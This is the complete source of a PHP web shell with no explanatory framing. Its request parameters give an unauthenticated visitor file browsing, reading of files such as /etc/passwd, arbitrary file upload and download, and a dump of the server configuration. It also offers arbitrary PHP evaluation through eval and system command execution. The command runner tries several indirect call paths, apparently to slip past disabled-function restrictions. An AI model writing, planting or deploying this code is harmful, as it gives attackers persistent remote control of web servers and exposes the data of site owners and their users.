<?php
@$action = $_REQUEST['action'];
@$path = $_REQUEST['path'];
function file_rwx($file)
{
    $perms = substr(sprintf('%o', fileperms($file)), -4);
    $rwx = ['---', '--x', '-w-', '-wx', 'r--', 'r-x', 'rw-', 'rwx'];
    $type = is_dir($file) ? 'd' : '-';
    $owner = $perms[1];
    $group = $perms[2];
    $public = $perms[3];
    return $type . $rwx[$owner] . $rwx[$group] . $rwx[$public] . ' ' .
    posix_getpwuid(fileowner($file))['name'];
}
function menu()
{
    print '<pre>' . get_current_user() . ' @ ' . php_uname() . PHP_EOL .
        '(menu) <a href=' . $_SERVER['PHP_SELF'] . '?action=ls&path=/>ls</a> |' .
        ' <a href=' . $_SERVER['PHP_SELF'] . '?action=cat&path=/etc/passwd>cat</a> |' .
        ' <a href=' . $_SERVER['PHP_SELF'] . '?action=upload>upload</a> |' .
        ' <a href=' . $_SERVER['PHP_SELF'] . '?action=phpinfo>phpinfo</a> |' .
        ' <a href=' . $_SERVER['PHP_SELF'] . '?action=info>info</a> |' .
        ' <a href=' . $_SERVER['PHP_SELF'] . '?action=eval&src=print+php_uname%28%29%3B>eval</a> |' .
        ' <a href=' . $_SERVER['PHP_SELF'] . '?action=exec&cmd=id>exec</a>' .
        '</pre>';
}
switch ($action) {
    case 'ls':
        $path = $_GET['path'];
        $files = array_diff(scandir($path), ['.', '..']);
        menu();
        foreach ($files as $file) {
            $location = $path . $file;
            if (is_dir($location)) {
                $url_action = 'ls';
                $location = rtrim($location, '/') . '/';
            } else {
                $url_action = 'cat';
            }
            $writable = is_writable($location) ? 'green' : 'red';
            $readable = is_readable($location) ? 'green' : 'red';
            if ($readable == 'green' and !is_dir($location))
                $download = '<a href=' . $_SERVER['PHP_SELF'] .
                    '?action=download&path=' . urlencode($location) .
                    '>Download</a></span>';
            else
                $download = 'Download';
            print '<pre>';
            print '<span style=\'color:' . $writable . '\'>Write</span> ' .
                '<span style=\'color:' . $readable . '\'>Read</span> | ' .
                $download . ' | ' .
                file_rwx($location) . ' | ' . date('M d Y H:i:s', filectime($location)) .
                ' <a href=' . $_SERVER['PHP_SELF'] . '?action=' .
                $url_action . '&path=' . urlencode($location) . '>' . $location .
                '</a>';
            print '</pre>';
        }
        return;
    case 'cat':
        $file = file_get_contents($path);
        menu();
        print '<pre>' . $file . '</pre>';
        return;
    case 'upload':
        @$file = $_FILES['file'];
        $message = null;
        if ($file) {
            move_uploaded_file($file['tmp_name'], $path);
            $message = 'Uploaded file to: <a href=' . $_SERVER['PHP_SELF'] . '?action=' .
                'cat&path=' . urlencode($path) . '>' . $path . '</a>';
        }
        menu();
        print '<form action="' . $_SERVER['PHP_SELF'] .
            '?action=upload" method="post" enctype="multipart/form-data"> ' .
            '<input type="file" name="file">' .
            'Full Destination Path & File: <input type="text" name="path">' .
            '<input type="submit" value="Upload"></form>';
        print $message;
        return;
    case 'download':
        header('Content-Type: application/octet-stream');
        header('Content-Transfer-Encoding: Binary');
        header('Content-disposition: attachment; filename="' . basename($path) . '"');
        echo readfile($path);
        return;
    case 'phpinfo':
        menu();
        phpinfo();
        return;
    case 'info':
        menu();
        print '<pre>';
        print 'Environment' . PHP_EOL;
        print 'Current User:    ' . get_current_user() . PHP_EOL;
        print 'PHP Version:     ' . phpversion() . PHP_EOL;
        print 'Loaded Config:   ' . php_ini_loaded_file() . PHP_EOL;
        print 'PHP SAPI:        ' . php_sapi_name() . PHP_EOL;
        print 'Uname:           ' . php_uname() . PHP_EOL;
        print '' . PHP_EOL;
        print 'Configuration' . PHP_EOL;
        print 'Open Basedir:        ' . ini_get('open_basedir') . PHP_EOL;
        print 'Disable Classes:     ' . ini_get('disable_classes') . PHP_EOL;
        print 'Disable Functions:   ' . ini_get('disable_functions') . PHP_EOL;
        print 'URL fopen:           ' . ini_get('allow_url_fopen') . PHP_EOL;
        print 'URL Include:         ' . ini_get('allow_url_include') . PHP_EOL;
        print 'File Uploads:        ' . ini_get('file_uploads') . PHP_EOL;
        print '</pre>';
        return;
    case 'eval':
        @$src = $_REQUEST['src'];
        menu();
        print '<form action="' . $_SERVER['PHP_SELF'] .
            '?action=eval" method="post" enctype="multipart/form-data"> ' .
            'PHP Code: <br><textarea name="src" rows="10" cols="70">' . $src . '</textarea><br>' .
            '<input type="submit" value="Evaluate PHP"></form>';
        if (!empty($src)) {
            print '<pre>Eval Output:<br>';
            eval($src);
            print '</pre>';
        }
        return;
    case 'exec':
        @$cmd = $_REQUEST['cmd'];
        menu();
        print '<form action="' . $_SERVER['PHP_SELF'] .
            '?action=exec" method="post" enctype="multipart/form-data"> ' .
            'System Command: <br><textarea name="cmd" rows="10" cols="70">' . $cmd . '</textarea><br>' .
            '<input type="submit" value="Run"></form>';
        if (!empty($cmd)) {
            print '<pre>Command Output:<br>';
            if (class_exists('ReflectionFunction')) {
                $function = new ReflectionFunction('system');
                $function->invoke($cmd);
            } elseif (function_exists('call_user_func_array')) {
                call_user_func_array('system', [$cmd]);
            } elseif (function_exists('call_user_func')) {
                call_user_func('system', $cmd);
            } else {
                system($cmd);
            }
            print '</pre>';
        }
        return;
    default:
        menu();
        return;
}
